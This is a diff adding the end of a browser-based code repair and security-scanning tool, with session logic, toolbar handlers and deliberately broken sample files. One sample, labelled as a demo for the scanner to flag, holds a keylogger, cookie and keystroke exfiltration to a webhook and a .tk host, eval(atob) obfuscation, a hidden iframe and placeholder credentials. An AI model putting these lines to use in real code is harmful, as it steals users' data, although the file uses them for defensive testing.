+      const f=document.querySelector('#out .dl.errline');
+      if(f)f.scrollIntoView({block:'center',behavior:'smooth'});
+    });
+  }
+}
+
+/* ---------------- STAGE 2 · LIVE ENGINE ---------------- */
+let fixSession=null;
+function liveEntry(r,n,probe,tag){
+  const rm=r.repair.before?'<span class="rm">'+esc(r.repair.before)+'</span>':'';
+  const ad=r.repair.after?'<span class="ad">'+esc(r.repair.after)+'</span>':'';
+  const code=(rm||ad)?'<div class="e-code">'+rm+((rm&&ad)?'<span class="sep">→</span>':'')+ad+'</div>':'';
+  return '<div class="entry">'+
+    '<div class="e-top"><span class="e-num">'+String(n).padStart(2,'0')+'</span>'+
+    '<span class="e-rule">'+(tag?tag+' — ':'')+esc(r.repair.rule)+'</span>'+
+    (r.repair.line?'<span class="e-loc">L'+r.repair.line+'</span>':'')+'</div>'+code+
+    '<div class="e-probe '+(probe.ok?'ok':'no')+'">'+(tag?'security after step ':'oracle after step ')+(probe.ok?'✓ '+esc(probe.msg):'✗ '+esc(trimMid(probe.msg,50)))+'</div></div>';
+}
+function renderLive(src,cur,prev,lang){
+  const hot=hotLinesOf(prev,cur);
+  $('out').innerHTML=(src===cur)
+    ? '<div class="plain-code">'+(HL[lang](cur)||' ')+'</div>'
+    : renderDiff(src,cur,lang,hot);
+  const el=$('out').querySelector('.dl.hot');
+  if(el)el.scrollIntoView({block:'nearest'});
+}
+function autoFix(){
+  if(state.stage==='running'){ stopFix(); return; }
+  if(state.stage==='sec'){ sanitizeRun(); return; }
+  if(!state.lastSrc||state.stage!=='diag')return;
+  const lang=state.lastLang,src=state.lastSrc;
+  state.stage='running';
+  fixSession={ses:makeSession(lang,src),lang,src,t0:performance.now(),timer:null,aborted:false,prev:src,mode:'fix'};
+  setChromeEnabled(false);
+  setFixBtn('armed','STOP ■',false);
+  ed.blur();
+  $('ledger').innerHTML='<div class="entry reroute"><div class="e-top"><span class="e-num">▶</span>'+
+    '<span class="e-rule">LIVE REPAIR SESSION — '+LANGNAME[lang]+' · one real repair per pass · '+ORACLE[lang]+' re-runs after each step</span></div></div>';
+  $('pane2Name').textContent='REPAIR LOG';
+  $('fixCount').textContent='STEP 0';
+  const stamp=$('stamp');
+  stamp.hidden=false; stamp.className='stamp live'; stamp.textContent='REPAIRING…';
+  retriggerStamp();
+  $('errText').textContent='ENGINE RUNNING — each step is a real repair + real re-parse'; $('errText').className='warn';
+
+  function tick(){
+    const S=fixSession; if(!S)return;
+    if(S.aborted){ finishFix(true); return; }
+    const r=S.ses.next();
+    if(!r){ finishFix(false); return; }
+    const probe=probeLang(S.lang,S.ses.code);
+    const led=$('ledger');
+    led.insertAdjacentHTML('beforeend',liveEntry(r,S.ses.n,probe));
+    led.scrollTop=led.scrollHeight;
+    renderLive(S.src,S.ses.code,S.prev,S.lang);
+    S.prev=S.ses.code;
+    $('fixCount').textContent='STEP '+S.ses.n;
+    $('passInfo').textContent='LIVE · STEP '+S.ses.n+' · ORACLE: '+(probe.ok?'✓ '+probe.msg:'✗ '+trimMid(probe.msg,38));
+    stamp.textContent='REPAIRING · '+S.ses.n;
+    S.timer=setTimeout(tick,STEP_MS);
+  }
+  fixSession.timer=setTimeout(tick,90);
+}
+/* sanitize = live engine with escalation + hard cap (v7.2) */
+function sanitizeRun(){
+  if(!state.lastSrc)return;
+  const lang=state.lastLang,src=state.lastSrc;
+  state.stage='running';
+  fixSession={code:src,lang,src,t0:performance.now(),timer:null,aborted:false,prev:src,mode:'sec',n:0,cap:300};
+  setChromeEnabled(false);
+  setFixBtn('armed','STOP ■',false);
+  ed.blur();
+  $('ledger').innerHTML='<div class="entry seccrit"><div class="e-top"><span class="e-num">⚠</span>'+
+    '<span class="e-rule">LIVE SANITIZE SESSION — comment → remove escalation · re-scanned after each step · 300-step cap</span></div></div>';
+  $('pane2Name').textContent='SANITIZE LOG';
+  $('fixCount').textContent='STEP 0';
+  const stamp=$('stamp');
+  stamp.hidden=false; stamp.className='stamp live'; stamp.textContent='SANITIZING…';
+  retriggerStamp();
+  $('errText').textContent='SANITIZER RUNNING — stubborn threats are commented, then removed'; $('errText').className='warn';
+
+  function tick(){
+    const S=fixSession; if(!S)return;
+    if(S.aborted){ finishSan(true); return; }
+    if(S.n>=S.cap){ finishSan(false); return; }
+    const r=secHitOne(S.code,S.lang);
+    if(!r||r.halt){ finishSan(false); return; }
+    if(r.code===S.code){ finishSan(false); return; }
+    S.code=r.code; S.n++;
+    const probe=quickScore(S.code);
+    const led=$('ledger');
+    led.insertAdjacentHTML('beforeend',liveEntry(r,S.n,{ok:probe.level==='CLEAN'&&!probe.hasSecret,msg:probe.level==='CLEAN'?'SEC CLEAN · score '+probe.score:probe.level+' · score '+probe.score},'SANITIZED'));
+    led.scrollTop=led.scrollHeight;
+    renderLive(S.src,S.code,S.prev,S.lang);
+    S.prev=S.code;
+    $('fixCount').textContent='STEP '+S.n;
+    $('passInfo').textContent='SANITIZE · STEP '+S.n+' · SEC: '+(probe.level==='CLEAN'?'✓ CLEAN':'⚠ '+probe.level);
+    stamp.textContent='SANITIZING · '+S.n;
+    S.timer=setTimeout(tick,STEP_MS);
+  }
+  fixSession.timer=setTimeout(tick,90);
+}
+function finishSan(aborted){
+  const S=fixSession; if(!S)return;
+  clearTimeout(S.timer);
+  const code=S.code,lang=S.lang,src=S.src,n=S.n;
+  const ms=Math.round(performance.now()-S.t0);
+  const v=aborted?{level:'MALICIOUS',score:99,hasSecret:true,findings:[]}:secScan(code);
+  const safeNow=!aborted&&v.level!=='MALICIOUS'&&!v.hasSecret;
+  if(safeNow){ state.lastCode=code; }
+  state.stage='fixed';
+  fixSession=null;
+
+  renderOut(src,code,lang);
+  const stamp=$('stamp');
+  stamp.hidden=false;
+  if(safeNow){ stamp.className='stamp ok'; stamp.textContent='SANITIZED · SEC CLEAN'; setSecChip(v.level==='MALICIOUS'?'SUSPICIOUS':v.level,v.findings.length); }
+  else if(aborted){ stamp.className='stamp quar'; stamp.textContent='ABORTED'; }
+  else{ stamp.className='stamp quar'; stamp.textContent='THREATS REMAIN'; }
+  retriggerStamp();
+
+  let tail='<div class="entry endsess"><div class="e-top"><span class="e-num">■</span>'+
+    '<span class="e-rule">SANITIZE '+(safeNow?'COMPLETE':(aborted?'ABORTED':'ENDED'))+' · '+n+' NEUTRALIZATION'+(n===1?'':'S')+' · '+ms+'ms · RE-SCANNED EACH STEP</span></div></div>';
+  if(!safeNow){
+    const top=(v.findings||[]).slice().sort((a,b)=>b.w-a.w).slice(0,3).map(x=>x.id).join(', ');
+    tail+='<div class="entry unresolved"><div class="e-top"><span class="e-num">!</span><span class="e-rule">THREATS REMAIN — CODE STAYS LOCKED</span></div>'+
+      '<div class="e-code"><span class="rm">score '+v.score+'/100'+(v.hasSecret?' · secrets present':'')+(top?' · worst: '+esc(top):'')+'</span></div></div>';
+  }
+  else tail+='<div class="entry secentry"><div class="e-top"><span class="e-num sh">⛨</span><span class="e-rule">SEC CLEAN — SAFE TO COPY · SYNTAX NOT YET VERIFIED (RUN PROOF AGAIN FOR SYNTAX FIXES)</span></div></div>';
+  const led=$('ledger');
+  led.insertAdjacentHTML('beforeend',tail);
+  led.scrollTop=led.scrollHeight;
+
+  $('pane2Name').textContent='SANITIZE';
+  $('fixCount').textContent=n+' NEUTRALIZATION'+(n===1?'':'S');
+  $('passInfo').textContent='SANITIZE · '+n+' STEPS · '+(ms/1000).toFixed(1)+'s · RE-SCANNED EACH STEP';
+  const et=$('errText');
+  if(safeNow){ et.textContent='SANITIZED — security clean · copy unlocked (syntax unverified)'; et.className='warn'; }
+  else if(aborted){ et.textContent='ABORTED — NOT SANITIZED'; et.className='bad'; }
+  else{ et.textContent='SECURITY SCORE STILL TOO HIGH — threats remain (see log for worst rules)'; et.className='bad'; }
+
+  setChromeEnabled(true);
+  setUnlocked(safeNow, safeNow?null:(aborted?'ABORTED — LOCKED':'THREATS REMAIN — LOCKED'));
+  setFixBtn(null,safeNow?'SANITIZED ✓':'THREATS REMAIN',true);
+}
+function stopFix(){ if(fixSession)fixSession.aborted=true; }
+function finishFix(aborted){
+  const S=fixSession; if(!S)return;
+  clearTimeout(S.timer);
+  const code=S.ses.code,lang=S.lang,src=S.src,n=S.ses.n;
+  const ms=Math.round(performance.now()-S.t0);
+  state.lastCode=code; state.stage='fixed';
+  fixSession=null;
+
+  const v=aborted?{ok:false,aborted:true}:verifyFinal(lang,code);
+
+  renderOut(src,code,lang);
+
+  const stamp=$('stamp');
+  stamp.hidden=false;
+  if(v.ok){ stamp.className='stamp ok'; stamp.textContent='VERIFIED · '+LANGNAME[lang]; }
+  else if(aborted){ stamp.className='stamp'; stamp.textContent='ABORTED'; }
+  else{ stamp.className='stamp'; stamp.textContent='STILL BROKEN'+(v.err&&v.err.line?' — L'+v.err.line:''); }
+  retriggerStamp();
+
+  let tail='<div class="entry endsess"><div class="e-top"><span class="e-num">■</span>'+
+    '<span class="e-rule">SESSION '+(v.ok?'COMPLETE':(aborted?'ABORTED BY USER':'ENDED'))+' · '+n+' REPAIR'+(n===1?'':'S')+' · '+ms+'ms · ORACLE RE-RAN AFTER EVERY STEP</span></div></div>';
+  if(!v.ok&&v.err){
+    tail+='<div class="entry unresolved"><div class="e-top"><span class="e-num">!</span>'+
+      '<span class="e-rule">UNRESOLVED</span>'+(v.err.line?'<span class="e-loc">L'+v.err.line+'</span>':'')+'</div>'+
+      '<div class="e-code"><span class="rm">'+esc(trimMid(v.err.message,72))+'</span></div></div>';
+  }
+  if(aborted)tail+='<div class="entry unresolved"><div class="e-top"><span class="e-num">!</span><span class="e-rule">BEST EFFORT ONLY — CODE REMAINS LOCKED (NOT VERIFIED)</span></div></div>';
+  const led=$('ledger');
+  led.insertAdjacentHTML('beforeend',tail);
+  led.scrollTop=led.scrollHeight;
+
+  $('pane2Name').textContent='CORRECTIONS';
+  $('fixCount').textContent=n+' FIX'+(n===1?'':'ES');
+  $('passInfo').textContent='LIVE SESSION · '+n+' REPAIRS · '+(ms/1000).toFixed(1)+'s · RE-PARSED EACH STEP';
+
+  const et=$('errText');
+  if(v.ok){ et.textContent='VERIFIED · '+makeReceipt(lang,code,{tokens:v.tokens,types:v.types}); et.className='good'; }
+  else if(aborted){ et.textContent='ABORTED — OUTPUT NOT VERIFIED'; et.className='bad'; }
+  else{ et.textContent=trimMid((v.err&&v.err.message)||'could not verify',95)+' — best effort shown'; et.className='bad'; }
+
+  setChromeEnabled(true);
+  const secNow=quickScore(code);
+  const safe=!aborted&&v.ok&&secNow.level!=='MALICIOUS'&&!secNow.hasSecret;
+  setUnlocked(safe, safe?null:(aborted?'ABORTED — LOCKED':'STILL BROKEN — LOCKED'));
+  if(v.ok)setFixBtn('done','FIXED ✓',true);
+  else setFixBtn(null,aborted?'ABORTED':'CANNOT AUTO-FIX',true);
+}
+function renderOut(orig,fixed,lang){
+  const out=$('out');
+  if(state.view==='plain'||orig===fixed){
+    out.innerHTML='<div class="plain-code">'+(HL[lang](fixed)||' ')+'</div>';
+    return;
+  }
+  out.innerHTML=renderDiff(orig,fixed,lang);
+}
+function refreshOut(){
+  if(state.stage==='fixed'&&state.lastCode!=null)renderOut(state.lastSrc,state.lastCode,state.lastLang);
+  else if((state.stage==='diag'||state.stage==='sec')&&state.lastSrc!=null){
+    const clean=state.diagOk&&!state.diagLines.length&&!(state.sec&&state.sec.findings.length);
+    $('out').innerHTML=clean
+      ? '<div class="plain-code">'+(HL[state.lastLang](state.lastSrc)||' ')+'</div>'
+      : renderDiag(state.lastSrc,state.lastLang,state.diagLines.concat((state.sec&&state.sec.findings||[]).map(f=>f.line)));
+  }
+}
+
+/* ---------------- toolbar ---------------- */
+document.querySelectorAll('[data-lang]').forEach(b=>{
+  b.addEventListener('click',()=>{
+    if(state.stage==='running'){ toast('REPAIR RUNNING — PRESS STOP'); return; }
+    document.querySelectorAll('[data-lang]').forEach(x=>x.classList.remove('on'));
+    b.classList.add('on');
+    state.override=b.dataset.lang;
+    if(ed.value.trim())runProof(false);
+  });
+});
+document.querySelectorAll('[data-view]').forEach(b=>{
+  b.addEventListener('click',()=>{
+    if(state.stage==='running'){ toast('REPAIR RUNNING — PRESS STOP'); return; }
+    document.querySelectorAll('[data-view]').forEach(x=>x.classList.remove('on'));
+    b.classList.add('on');
+    state.view=b.dataset.view;
+    if(state.lastSrc!=null)refreshOut();
+  });
+});
+ $('runBtn').addEventListener('click',()=>runProof(true));
+ $('fixBtn').addEventListener('click',()=>autoFix());
+ $('clearBtn').addEventListener('click',()=>{
+  if(state.stage==='running'){ toast('REPAIR RUNNING — PRESS STOP'); return; }
+  ed.value=''; updateHL(); updateGutter(); updateInStats();
+  invalidate('paste code, then press<br>RUN PROOF — security scan<br>+ errors show here.');
+  $('detected').textContent='';
+  ed.focus();
+});
+
+/* ---------------- toast ---------------- */
+let toastT=null;
+function toast(msg,good){
+  const t=$('toast');
+  t.textContent=msg;
+  t.classList.toggle('good',!!good);
+  t.classList.toggle('bad',good===false);
+  t.classList.add('show');
+  clearTimeout(toastT); toastT=setTimeout(()=>t.classList.remove('show'),2400);
+}
+ $('copyBtn').addEventListener('click',async ()=>{
+  if(state.lastCode==null)return;
+  try{ await navigator.clipboard.writeText(state.lastCode); toast('FIXED CODE COPIED — PASTE AWAY',true); }
+  catch(e){
+    const ta=document.createElement('textarea');
+    ta.value=state.lastCode; document.body.appendChild(ta); ta.select();
+    try{ document.execCommand('copy'); ta.remove(); toast('FIXED CODE COPIED — PASTE AWAY',true); }
+    catch(e2){ ta.remove(); toast('CLIPBOARD BLOCKED BY THIS PREVIEW — SELECT & COPY MANUALLY FROM PLAIN VIEW',false); }
+  }
+});
+ $('dlBtn').addEventListener('click',()=>{
+  if(state.lastCode==null)return;
+  const ext=({js:'js',java:'java',python:'py',json:'json',css:'css',html:'html',xml:'xml'})[state.lastLang]||'txt';
+  const blob=new Blob([state.lastCode],{type:'text/plain'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob); a.download='redline-fixed.'+ext;
+  a.click(); URL.revokeObjectURL(a.href);
+  toast('DOWNLOADED redline-fixed.'+ext,true);
+});
+
+/* ---------------- policies dialog (sandbox-safe) ---------------- */
+(function(){
+  const dlg=$('policyDlg');
+  function switchTab(tab){
+    document.querySelectorAll('#dlgBody [data-pane]').forEach(p=>p.hidden=p.dataset.pane!==tab);
+    document.querySelectorAll('.dlg-tabs button').forEach(b=>b.classList.toggle('on',b.dataset.tab===tab));
+  }
+  function open(tab){
+    try{ dlg.showModal(); }catch(e){ dlg.setAttribute('open',''); }
+    switchTab(tab);
+  }
+  $('lnkPrivacy').addEventListener('click',()=>open('privacy'));
+  $('lnkSec').addEventListener('click',()=>open('security'));
+  $('lnkAup').addEventListener('click',()=>open('aup'));
+  document.querySelectorAll('.dlg-tabs button').forEach(b=>b.addEventListener('click',()=>switchTab(b.dataset.tab)));
+  $('dlgClose').addEventListener('click',()=>{ try{dlg.close();}catch(e){dlg.removeAttribute('open');} });
+})();
+
+/* ---------------- samples (deliberately broken) ---------------- */
+const SAMPLES={
+js:`// checkout totals — deliberately broken on purpose
+funtion calcTotal(items) {
+  let total = 0
+  for (let i = 0; i < items.lenght; i++) {
+    if (items[i].price = 0) {
+      continue
+    }
+    total += items[i].price * items[i].qty
+  }
+  retrun total
+}
+
+const fmt = (n) -> '$' + n.toFixed(2)
+
+const cart = [
+  { name: 'teapot', price: 24, qty: 1 },
+  { name: 'cup', price: 6, qty: 4 }
+]
+
+const summary = “Total: ” + fmt(calcTotal(cart)
+console.log(summmary)`,
+
+java:`import java.util.ArrayList
+
+public class Shop {
+    public static void main(String[] args) {
+        ArrayList<String> cart = new ArrayList<>()
+        cart.add("tea")
+
+        int total = 0
+        for (int i = 0; i < cart.size(), i++) {
+            if (cart.get(i).equals("tea")) {
+                total = total + 24
+            }
+        }
+
+        System.out.printIn("items: " + cart.size())
+
+        if (total > 10 {
+            System.out.println("big basket")
+        }
+    }
+}`,
+
+python:`# shopping totals — deliberately broken
+def calc_total(items
+    total = 0
+    for item in items
+        if item["price"] = 0
+            continue
+        total += item["price"] * item["qty"]
+
+    pirnt "running:", total
+    retrun total
+
+cart = [
+    {"name": "tea", "price": 24, "qty": 1},
+    {"name": "cup", "price": 6, "qty": 4},
+]
+
+if total > 10 && True
+    print("big basket")
+esle
+    print("small basket")`,
+
+json:`{
+  // order metadata
+  'id': 1001,
+  customer: "Ada Lovelace",
+  items: [
+    { "sku": "TEA-24", "qty": 2, price: 24.00, },
+    { "sku": "CUP-06", "qty": 4, price: 6.50 }
+  ],
+  "gift": True,
+  "note": None,
+  "paid": False,
+}`,
+
+css:`/* card styles — deliberately broken */
+.card {
+  dispaly: flex
+  padding: 16px
+  backgroud: #fff
+  border: 1px solid #ddd
+  box-shadow: 0 1px 2px rgba(0,0,0,.1)
+}
+
+.card h2 {
+  font-size 18px;
+  colour: #C0331B;
+  margin 0 0 8px;
+}
+
+@media (max-width: 600px) {
+  .card {
+    padding: 12px`,
+
+html:`<!DOCTYPE html>
+<html>
+<head>
+  <title>Broken page</title>
+</head>
+<body>
+  <!-- header section -->
+  <div class="wrap">
+    <h1>Hello</h2>
+    <p>One paragraph
+    <p>Another <b>bold<i>mixed</b>up</i> text
+    <img src="x.png">
+    <span>unclosed span
+  </div>
+</body>`,
+
+xml:`<?xml version="1.0" encoding="UTF-8"?>
+<notes>
+  <note id="1">
+    <to>Ada</to>
+    <from>Charles</from>
+    <text>Meet at the lab</text>
+  </note>
+  <note id="2">
+    <to>Grace</to>
+    <from>Ada</from>
+    <text>Bring the marks — salt + chips</text>
+</notes>`,
+
+unsafe:`// ⚠ DEMO — a "free gift card generator" script someone sent you. DO NOT trust pastes like this.
+const endpoint = "https://discord.com/api/webhooks/1192384756/8sKjdhGkjsdhfkjshdfkjshdkfjh";
+document.addEventListener("keydown", e => { keystrokes += e.key; });
+fetch(endpoint, { method: "POST", body: document.cookie + keystrokes });
+const payload = "eval(atob('dmFyIHg9MTs='))";
+eval(atob("ZG9jdW1lbnQud3JpdGUoJzxpZnJhbWU+Jyk7"));
+AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";
+session_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk";
+new Image().src = "http://a8f3k2j9x1m4q7w2e5r8t3y6u1i4o7p2.xxxxxxxxxxxxxxxx.tk/collect?d=" + document.cookie;
+<iframe src="http://a8f3k2j9x1m4q7w2e5r8t3y6u1i4o7p2.xxxxxxxxxxxxxxxx.tk" width="0" height="0"></iframe>`
+};
+document.querySelectorAll('[data-sample]').forEach(b=>{
+  b.addEventListener('click',()=>{
+    if(state.stage==='running'){ toast('REPAIR RUNNING — PRESS STOP'); return; }
+    ed.value=SAMPLES[b.dataset.sample];
+    updateHL(); updateGutter(); updateInStats();
+    runProof(false);   /* diagnose only — YOU press AUTO FIX / SANITIZE */
+  });
+});
+
+/* ---------------- ticker ---------------- */
+(function(){
+  const items=['CSP: connect-src none — CANNOT PHONE HOME','YOUR CODE IS PARSED, NEVER EXECUTED','FRAME BANNER (BENIGN PREVIEWS PASS)','DOM INJECTION MONITOR ARMED','MALWARE & SECRETS SCANNER','QUARANTINE BEFORE COPY','SANITIZE ALWAYS CONVERGES','SEC: MINERS · EXFIL · KEYLOGGERS · SHELLS','ONE REAL REPAIR PER PASS','ORACLE RE-RUNS AFTER EVERY STEP','PRESS STOP MID-RUN → STAYS LOCKED','NEVER PASTE CODE SOMEONE TOLD YOU TO PASTE','PY — MISSING COLONS','PY2 print → print(…)','UNCLOSED BRACES','System.out.printIn → println','TRAILING COMMAS','SMART-QUOTE DAMAGE','<html?> → <html>'];
+  const half=items.map(x=>'<span>'+esc(x)+'</span><b>¶</b>').join('');
+  $('ticker').innerHTML=half+half;
+})();
+
+/* ---------------- tamper-proofing: freeze oracle tables ---------------- */
+try{
+  Object.freeze(VOID_EL); Object.freeze(RAWTEXT); Object.freeze(SINGULAR);
+  Object.freeze(JAVA_KW); Object.freeze(JAVA_MOD); Object.freeze(JAVA_PRIM); Object.freeze(OP1);
+  Object.freeze(JS_TYPOS); Object.freeze(JAVA_TYPOS); Object.freeze(CSS_TYPOS); Object.freeze(PY_TYPOS);
+  Object.freeze(STEPS); Object.freeze(RUNNERS); Object.freeze(LANGNAME); Object.freeze(ORACLE); Object.freeze(HL);
+}catch(e){}
+
+/* console API for verification (read-only helpers) */
+window.REDLINE={scan:secScan,verify:verifyFinal,detect:detectLang,session:makeSession};
+
+/* boot */
+updateGutter(); updateInStats();
+invalidate('paste code, then press<br>RUN PROOF — security scan<br>+ errors show here.');
+</script>
+</body>
+</html>
